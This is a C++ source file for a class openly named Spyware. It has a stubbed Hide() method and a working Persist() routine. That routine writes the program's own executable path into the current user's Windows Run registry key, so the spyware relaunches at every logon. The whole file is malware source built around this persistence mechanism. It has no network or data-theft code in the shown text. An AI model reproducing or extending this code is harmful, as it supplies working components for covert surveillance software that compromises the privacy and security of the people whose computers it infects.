#include "Spyware.h"

Spyware::Spyware()
{
}

Spyware::~Spyware()
{
}

void Spyware::Persist()
{
	this->RegisterMyProgramForStartup();
}

void Spyware::Hide()
{
}

BOOL Spyware::RegisterMyProgramForStartup()
{
	PCWSTR pszAppName = L"Spyware.exe";
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};
	wchar_t pathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, pathToExe, MAX_PATH);

	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");


	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (DWORD)(wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}
